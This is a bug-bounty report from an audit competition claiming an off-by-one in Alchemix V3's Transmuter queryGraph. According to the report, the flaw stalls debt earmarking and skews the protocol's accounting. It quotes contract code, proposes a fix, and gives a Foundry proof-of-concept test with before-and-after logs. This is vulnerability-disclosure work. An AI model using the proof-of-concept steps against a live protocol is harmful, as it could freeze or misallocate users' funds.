# 58413 sc critical attacker user can prevent earmark from updating the earnmarkweight causing the transmuter action to repay det gradually to fail for all users

**Submitted on Nov 2nd 2025 at 04:51:59 UTC by @damdam0249 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58413
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/Transmuter.sol>
* **Impacts:**
  * Temporary freezing of funds for at least 24 hour

## Description

## Brief/Intro

Users who lock their debt tokens in the transmuter will have their debt repaid gradually based on the time taken to transmute. However, there is an issue with the query function in the transmuter, which incorrectly returns 0 when both the start and end blocks are the same we set to zero. This means in a constant update or "poke" within the same block number, 0 debt are earmark. Consequently, this causes the entire transmuter repayment system to fail, and users end up spending more funds to clear this debt than they would have otherwise. This situation highlights the risk of freezing the earmark or debt repayment model in the transmuter, ultimately forcing users to repay with MYT or face liquidation.

## Vulnerability Details

```solidity
   
/// @inheritdoc ITransmuter
    function queryGraph(uint256 startBlock, uint256 endBlock) external view returns (uint256) {

@here bug        if (endBlock <= startBlock) return 0;

        int256 queried = _stakingGraph.queryStake(startBlock, endBlock);
        if (queried == 0) return 0;

        // You currently add +1 for rounding; keep in mind this can create off-by-one deltas.
        return (queried / BLOCK_SCALING_FACTOR).toUint256()
            + (queried % BLOCK_SCALING_FACTOR == 0 ? 0 : 1);
    }
```

The earmark function calls query and set and check lastsaved earmarked = 1 against block.number. If poke is done within this time frame, the attacker/user will successfully keep the system stagnant preventing the earmarked process from proceed as it should.

```solidity
 /// @dev Earmarks the debt for redemption.
    function _earmark() internal {
        if (totalDebt == 0) return;
        if (block.number <= lastEarmarkBlock) return;

        // Yield the transmuter accumulated since last earmark (cover)
        uint256 transmuterCurrentBalance = TokenUtils.safeBalanceOf(myt, address(transmuter));
        uint256 transmuterDifference = transmuterCurrentBalance > lastTransmuterTokenBalance ? transmuterCurrentBalance - lastTransmuterTokenBalance : 0;

  @here returns 0      uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);   // problem..........
```

This is a huge problem during the redeem call as the system will not update the entire system correctly forcing total debt to be greater than total synthetic asset also this affects the collateral weight which is used with the rawlocked this causes the entire system values to be incorrect

```solidity
/// @inheritdoc IAlchemistV3Actions
    function redeem(uint256 amount) external onlyTransmuter {
        _earmark();

@here        uint256 liveEarmarked = cumulativeEarmarked;

@here        if (amount > liveEarmarked) amount = liveEarmarked;

        // observed transmuter pre-balance -> potential cover
        uint256 transmuterBal = TokenUtils.safeBalanceOf(myt, address(transmuter));
        uint256 deltaYield    = transmuterBal > lastTransmuterTokenBalance ? transmuterBal - lastTransmuterTokenBalance : 0;
        uint256 coverDebt = convertYieldTokensToDebt(deltaYield);

        // cap cover so we never consume beyond remaining earmarked

@here        uint256 coverToApplyDebt = amount + coverDebt > liveEarmarked ? (liveEarmarked - amount) : coverDebt;

        uint256 redeemedDebtTotal = amount + coverToApplyDebt;

       // Apply redemption weights/decay to the full amount that left the earmarked bucket

@here        if (liveEarmarked != 0 && redeemedDebtTotal != 0) {

@here            uint256 survival = ((liveEarmarked - redeemedDebtTotal) << 128) / liveEarmarked;

@here            _survivalAccumulator = _mulQ128(_survivalAccumulator, survival);
 
@here           _redemptionWeight += PositionDecay.WeightIncrement(redeemedDebtTotal, cumulativeEarmarked);
        }

```

```solidity
/// @dev Update the user's earmarked and redeemed debt amounts.
    function _sync(uint256 tokenId) internal {
        Account storage account = _accounts[tokenId];

        uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight); // rawlocked is subject to change recalculate it and then release.
        account.collateralBalance -= collateralToRemove;                                                                                // else we are looking at a dos underflow here bug review 

        // Redemption survival now and at last sync
        // Survival is the amount of earmark that is left after a redemption
        uint256 redemptionSurvivalOld = PositionDecay.SurvivalFromWeight(account.lastAccruedRedemptionWeight);
        if (redemptionSurvivalOld == 0) redemptionSurvivalOld = ONE_Q128;
        uint256 redemptionSurvivalNew  = PositionDecay.SurvivalFromWeight(_redemptionWeight);
        // Survival during current sync window
        uint256 survivalRatio = _divQ128(redemptionSurvivalNew, redemptionSurvivalOld);
        // User exposure at last sync used to calculate newly earmarked debt pre redemption
@here        uint256 userExposure = account.debt > account.earmarked ? account.debt - account.earmarked : 0;

@here         uint256 earmarkRaw = PositionDecay.ScaleByWeightDelta(userExposure, _earmarkWeight - account.lastAccruedEarmarkWeight);

        // Earmark survival at last sync
        // Survival is the amount of unearmarked debt left after an earmark
@here         uint256 earmarkSurvival = PositionDecay.SurvivalFromWeight(account.lastAccruedEarmarkWeight);
        if (earmarkSurvival == 0) earmarkSurvival = ONE_Q128;
        // Decay snapshot by what was redeemed from last sync until now
        uint256 decayedRedeemed = _mulQ128(account.lastSurvivalAccumulator, survivalRatio);
        // What was added to the survival accumulator in the current sync window
        uint256 survivalDiff = _survivalAccumulator > decayedRedeemed ? _survivalAccumulator - decayedRedeemed : 0;

        // Unwind accumulated earmarked at last sync
        uint256 unredeemedRatio = _divQ128(survivalDiff, earmarkSurvival);
        // Portion of earmark that remains after applying the redemption. Scaled back from 128.128

@here         uint256 earmarkedUnredeemed = _mulQ128(userExposure, unredeemedRatio);


@here         if (earmarkedUnredeemed > earmarkRaw) earmarkedUnredeemed = earmarkRaw;

        // Old earmarks that survived redemptions in the current sync window
@here         uint256 exposureSurvival = _mulQ128(account.earmarked, survivalRatio);
        // What was redeemed from the newly earmark between last sync and now
        uint256 redeemedFromEarmarked = earmarkRaw - earmarkedUnredeemed;
        // Total overall earmarked to adjust user debt
        uint256 redeemedTotal = (account.earmarked - exposureSurvival) + redeemedFromEarmarked;

        account.earmarked = exposureSurvival + earmarkedUnredeemed;

@here         account.debt = account.debt >= redeemedTotal ? account.debt - redeemedTotal : 0;

        // Update locked collateral
        account.rawLocked = convertDebtTokensToYield(account.debt) * minimumCollateralization / FIXED_POINT_SCALAR;

        // Advance account checkpoint
        account.lastCollateralWeight = _collateralWeight;
        account.lastAccruedEarmarkWeight = _earmarkWeight;
        account.lastAccruedRedemptionWeight = _redemptionWeight;

        // Snapshot G for this account
```

## Impact Details

The main consequence is that the transmuter’s earmark process can get stuck, freezing redemptions and throwing the global debt and collateral accounting out of sync. This creates several issues:

Debt and Collateral Mismatch: The total debt stays higher than the total supply of synthetic assets, breaking key system assumptions.

Higher Repayment Costs: Users may need to repay more debt than expected or use extra MYT to clear their positions.

Incorrect Collateral Tracking: Locked collateral values (like rawLocked and \_totalLocked) become inconsistent with the actual debt, which can trigger underflows or inaccurate collateral weight calculations.

System-Wide Failure Risk: Continuous zero-return earmarks can effectively block redemptions and liquidations, leading to a persistent denial-of-service across the system.

## References

```solidity
function queryGraph(uint256 startBlock, uint256 endBlock) external view returns (uint256) {
    // ✅ Allow single-block queries
    if (endBlock < startBlock) return 0;

    int256 queried = _stakingGraph.queryStake(startBlock, endBlock);
    if (queried == 0) return 0;

    return (queried / BLOCK_SCALING_FACTOR).toUint256()
        + (queried % BLOCK_SCALING_FACTOR == 0 ? 0 : 1);
}
```

## Proof of Concept

## Proof of Concept

```solidity
function testearnmarked_function() external {
    // Seed the system with whale liquidity
    vm.startPrank(someWhale);
    IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
    vm.stopPrank();


    console.log("Initial Balance of myt token of 0xbeef", vault.balanceOf(address(0xbeef)));

    // User 0xbeef opens a position
    vm.startPrank(address(0xbeef));
    uint256 depositAmount = 50e18;
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, address(0xbeef), 0);


    console.log("Initial oxbeef altoken/debt token balance",address(alToken),alToken.balanceOf(address(0xbeef)));   

    uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    uint256 mintAmount = alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization;
    alchemist.mint(tokenIdFor0xBeef, mintAmount, address(0xbeef));
    vm.stopPrank();

        // Snapshot before manipulation
    (uint256 prevCollateral0, uint256 prevDebt0, uint marked0) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral0",prevCollateral0);
    console.log("marked0",marked0);
    console.log("prevDebt0",prevDebt0);


      vm.roll(block.number +  1);


     alchemist.poke(tokenIdFor0xBeef);
        
    (uint256 prevCollateral1, uint256 prevDebt1, uint marked1) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral1",prevCollateral1);
    console.log("marked1 no transmuter action",marked1);
    console.log("prevDebt1",prevDebt1);


    console.log("0xbeef altoken/debt token balance before we created redemption",address(alToken),alToken.balanceOf(address(0xbeef)));



     console.log("Balance of myt token of 0xbeef before creating in the transmuter", (vault).balanceOf(address(0xbeef)));

    // Redemption process to reduce global bad debt
   vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
    transmuterLogic.createRedemption(mintAmount);
    vm.stopPrank();


   

     alchemist.poke(tokenIdFor0xBeef);

    console.log("Weight of the alchemist before ",alchemist.weightall());
    console.log("Account collateral weight of address beef before", alchemist.accountCollateralWeight(tokenIdFor0xBeef));
     console.log("Total locked before poking",alchemist.totallocked());
     

   
    (uint256 prevCollateral2, uint256 prevDebt2, uint marked2) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral2",prevCollateral2);
    console.log("marked2 after the point of transmuter interaction after 1 block",marked2);
    console.log("prevDebt2",prevDebt2);

     console.log("Total debt before",alchemist.totalSyntheticsIssued());
     console.log("Earmarked weight on creation ", alchemist.earmarkedweight());
      console.log("survivalaccumulator on creation", alchemist.survivalaccumulator());
       console.log("Cumulative Earnmark at creation time",alchemist.cumulativeEarmarked());


     vm.roll(block.number + 1);

    
    


     alchemist.poke(tokenIdFor0xBeef);

    (uint256 prevCollateral3, uint256 prevDebt3, uint marked3) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral3",prevCollateral3);
    console.log("marked3 after the point of transmuter interaction 12 seconds",marked3);
    console.log("prevDebt3",prevDebt3);

    console.log("Weight of the 1st block poke alchemist before",alchemist.weightall());
    console.log("Account collateral weight of 1st block poke address beef ", alchemist.accountCollateralWeight(tokenIdFor0xBeef));
      console.log("Total locked after poking 1st block",alchemist.totallocked());
           console.log("Earmarked weight 1st block", alchemist.earmarkedweight());
      console.log("survivalaccumulator 1st block", alchemist.survivalaccumulator());
       console.log("Cumulative Earnmark 1st block",alchemist.cumulativeEarmarked());

       (uint rawLocked,uint lastCollateralWeight,uint lastAccruedEarmarkWeight,uint lastAccruedRedemptionWeight,uint lastSurvivalAccumulator ) = alchemist.seelockedindividual(tokenIdFor0xBeef);
       console.log("Locked for beef",rawLocked);
       console.log("Last weight 1 block for beef",lastCollateralWeight);
       console.log("Last accrued earmarkweight 1 BLOCK",lastAccruedEarmarkWeight);
       console.log("Last Accrued Redemption 1 block",lastAccruedRedemptionWeight);
       console.log("Last survivalaccumulator 1 block", lastSurvivalAccumulator);





    vm.roll(block.number + 5_256_200);

    vm.startPrank(address(0xbeef));
    transmuterLogic.claimRedemption(1);
    vm.stopPrank();

     console.log("Balance of myt token of 0xbeef after transmuter interactions", (vault).balanceOf(address(0xbeef)));


     console.log("Weight of the alchemist after",alchemist.weightall());
    console.log("Account collateral weight of address beef after", alchemist.accountCollateralWeight(tokenIdFor0xBeef));
      console.log("Total locked after claim",alchemist.totallocked());
      console.log("Earmarked weight after claim", alchemist.earmarkedweight());
      console.log("survivalaccumulator after claim", alchemist.survivalaccumulator());
       console.log("Cumulative Earnmark 1st block",alchemist.cumulativeEarmarked());


      vm.roll(block.number + 5_256_300);

    // Final poke to sync weights and verify post-liquidation state
    vm.startPrank(address(0xbeef));
    console.log("Collateral balance before poke:", alchemist.collateralbalancechecker(tokenIdFor0xBeef));
    alchemist.poke(tokenIdFor0xBeef);
    console.log("Collateral balance after:", alchemist.collateralbalancechecker(tokenIdFor0xBeef));
    vm.stopPrank();

           (uint rawLocked1,uint lastCollateralWeight1,uint lastAccruedEarmarkWeight1,uint lastAccruedRedemptionWeight1,uint lastSurvivalAccumulator1 ) = alchemist.seelockedindividual(tokenIdFor0xBeef);
       console.log("Locked for beef finally",rawLocked1);
       console.log("Last weight  for beef",lastCollateralWeight1);
       console.log("Last accrued earmarkweight ",lastAccruedEarmarkWeight1);
       console.log("Last Accrued Redemption ",lastAccruedRedemptionWeight1);
       console.log("Last survivalaccumulator ", lastSurvivalAccumulator1);



     console.log("Total locked after everything",alchemist.totallocked());
        console.log("Earmarked weight after  poking", alchemist.earmarkedweight());
      console.log("survivalaccumulator after poking", alchemist.survivalaccumulator());
        console.log("Cumulative Earnmark after poking",alchemist.cumulativeEarmarked());

    (uint256 prevCollateral4, uint256 prevDebt4, uint marked4) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral4",prevCollateral4);
    console.log("marked4 after the point of transmuter interaction",marked4);
    console.log("prevDebt4",prevDebt4);
    console.log("Total debt after",alchemist.totalSyntheticsIssued());

     vm.roll(block.number + 5_256_300);

    (uint256 prevCollateral5, uint256 prevDebt5, uint marked5) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral5",prevCollateral5);
    console.log("marked5 after the point of transmuter interaction",marked5);
    console.log("prevDebt5",prevDebt5);
    console.log("Total debt after everything",alchemist.totalSyntheticsIssued());
     console.log("Total debt of debt in alchemix after everything",alchemist.totalDebt());

      console.log("0xbeef altoken/debt token balance after",address(alToken),alToken.balanceOf(address(0xbeef)));
      console.log("Total ",alchemist.weightall());


      if (prevDebt5 > 0)  {
    vm.startPrank(address(0xbeef));
     SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.repay(prevDebt5, tokenIdFor0xBeef);
    vm.stopPrank();
  }
 (uint256 prevCollateral6, uint256 prevDebt6, uint marked6) = alchemist.getCDP(tokenIdFor0xBeef);
    console.log("prevCollateral6",prevCollateral6);
    console.log("marked6 after repay",marked6);
    console.log("prevDebt6",prevDebt6);

      console.log("Balance of myt token of 0xbeef before after transmuter interactions", ((vault).balanceOf(address(0xbeef)) + prevCollateral6));

  console.log("Total locked after everything including repay",alchemist.totallocked());
}
```

RESULT

Total synthetic debt is 0 Total debt > 0 And users pay more than the should the log of 1 is the present code

```solidity
Ran 2 tests for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testearnmarked_function() (gas: 3828491)
Logs:
  Initial Balance of myt token of 0xbeef 200000000000000000000000
  Initial oxbeef altoken/debt token balance 0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b 0
  prevCollateral0 50000000000000000000
  marked0 0
  prevDebt0 45000000000000000004
  prevCollateral1 50000000000000000000
  marked1 no transmuter action 0
  prevDebt1 45000000000000000004
  0xbeef altoken/debt token balance before we created redemption 0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b 45000000000000000004
  Balance of myt token of 0xbeef before creating in the transmuter 199950000000000000000000
  Weight of the alchemist before  0
  Account collateral weight of address beef before 0
  Total locked before poking 49999999999999999999
  prevCollateral2 50000000000000000000
  marked2 after the point of transmuter interaction after 1 block 0
  prevDebt2 45000000000000000004
  Total debt before 45000000000000000004
  Earmarked weight on creation  0
  survivalaccumulator on creation 0
  Cumulative Earnmark at creation time 0
  prevCollateral3 50000000000000000000
  marked3 after the point of transmuter interaction 12 seconds 0
  prevDebt3 45000000000000000004
  Weight of the 1st block poke alchemist before 0
  Account collateral weight of 1st block poke address beef  0
  Total locked after poking 1st block 49999999999999999999
  Earmarked weight 1st block 0
  survivalaccumulator 1st block 0
  Cumulative Earnmark 1st block 0
  Locked for beef 49999999999999999999
  Last weight 1 block for beef 0
  Last accrued earmarkweight 1 BLOCK 0
  Last Accrued Redemption 1 block 0
  Last survivalaccumulator 1 block 0
  Balance of myt token of 0xbeef after transmuter interactions 199994954991446917808224
  Weight of the alchemist after 4596453000031689451014033423164134941
  Account collateral weight of address beef after 0
  Total locked after claim 0
  Earmarked weight after claim 29675724607597041002709835210573696176
  survivalaccumulator after claim 0
  Cumulative Earnmark 1st block 0
  Collateral balance before poke: 50000000000000000000
  Collateral balance after: 4550008647260273969
  Locked for beef finally 9512937595127
  Last weight  for beef 4596453000031689451014033423164134941
  Last accrued earmarkweight  29675724607597041002709835210573696176
  Last Accrued Redemption  170141183460469231731687303715884105729
  Last survivalaccumulator  0
  Total locked after everything 0
  Earmarked weight after  poking 29675724607597041002709835210573696176
  survivalaccumulator after poking 0
  Cumulative Earnmark after poking 0
  prevCollateral4 4550008647260273969
  marked4 after the point of transmuter interaction 0
  prevDebt4 8561643835615
  Total debt after 0
  prevCollateral5 4550008647260273969
  marked5 after the point of transmuter interaction 0
  prevDebt5 8561643835615
  Total debt after everything 0
  Total debt of debt in alchemix after everything 8561643835616
  0xbeef altoken/debt token balance after 0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b 0
  Total  4596453000031689451014033423164134941
  prevCollateral6 4550008561643835613
  marked6 after repay 0
  prevDebt6 0
  Balance of myt token of 0xbeef before after transmuter interactions 199999504991446917808222
  Total locked after everything including repay 0
```

2 RESULT of how the system should work and user's expected balance ideally

```solidity

Ran 2 tests for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testearnmarked_function() (gas: 3205225)
Logs:
  Initial Balance of myt token of 0xbeef 200000000000000000000000
  Initial oxbeef altoken/debt token balance 0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b 0
  prevCollateral0 50000000000000000000
  marked0 0
  prevDebt0 45000000000000000004
  prevCollateral1 50000000000000000000
  marked1 no transmuter action 0
  prevDebt1 45000000000000000004
  0xbeef altoken/debt token balance before we created redemption 0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b 45000000000000000004
  Balance of myt token of 0xbeef before creating in the transmuter 199950000000000000000000
  Weight of the alchemist before  0
  Account collateral weight of address beef before 0
  Total locked before poking 49999999999999999999
  prevCollateral2 50000000000000000000
  marked2 after the point of transmuter interaction after 1 block 0
  prevDebt2 45000000000000000004
  Total debt before 45000000000000000004
  Earmarked weight on creation  0
  survivalaccumulator on creation 0
  Cumulative Earnmark at creation time 0
  prevCollateral3 50000000000000000000
  marked3 after the point of transmuter interaction 12 seconds 0
  prevDebt3 45000000000000000004
  Weight of the 1st block poke alchemist before 0
  Account collateral weight of 1st block poke address beef  0
  Total locked after poking 1st block 49999999999999999999
  Earmarked weight 1st block 0
  survivalaccumulator 1st block 0
  Cumulative Earnmark 1st block 0
  Locked for beef 49999999999999999999
  Last weight 1 block for beef 0
  Last accrued earmarkweight 1 BLOCK 0
  Last Accrued Redemption 1 block 0
  Last survivalaccumulator 1 block 0
  Balance of myt token of 0xbeef after transmuter interactions 199994955000000000000004
  Weight of the alchemist after 4596456644555066734126429258866559846
  Account collateral weight of address beef after 0
  Total locked after claim 0
  Earmarked weight after claim 170141183460469231731687303715884105729
  survivalaccumulator after claim 0
  Cumulative Earnmark 1st block 0
  Collateral balance before poke: 50000000000000000000
  Collateral balance after: 4549999999999999995
  Locked for beef finally 0
  Last weight  for beef 4596456644555066734126429258866559846
  Last accrued earmarkweight  170141183460469231731687303715884105729
  Last Accrued Redemption  170141183460469231731687303715884105729
  Last survivalaccumulator  0
  Total locked after everything 0
  Earmarked weight after  poking 170141183460469231731687303715884105729
  survivalaccumulator after poking 0
  Cumulative Earnmark after poking 0
  prevCollateral4 4549999999999999995
  marked4 after the point of transmuter interaction 0
  prevDebt4 0
  Total debt after 0
  prevCollateral5 4549999999999999995
  marked5 after the point of transmuter interaction 0
  prevDebt5 0
  Total debt after everything 0
  Total debt of debt in alchemix after everything 0
  0xbeef altoken/debt token balance after 0x9B137463d4E7986D7f535f9B79e28b4EF1938E9b 0
  Total  4596456644555066734126429258866559846
  prevCollateral6 4549999999999999995
  marked6 after repay 0
  prevDebt6 0
  Balance of myt token of 0xbeef before after transmuter interactions 199999504999999999999999
  Total locked after everything including repay 0




```
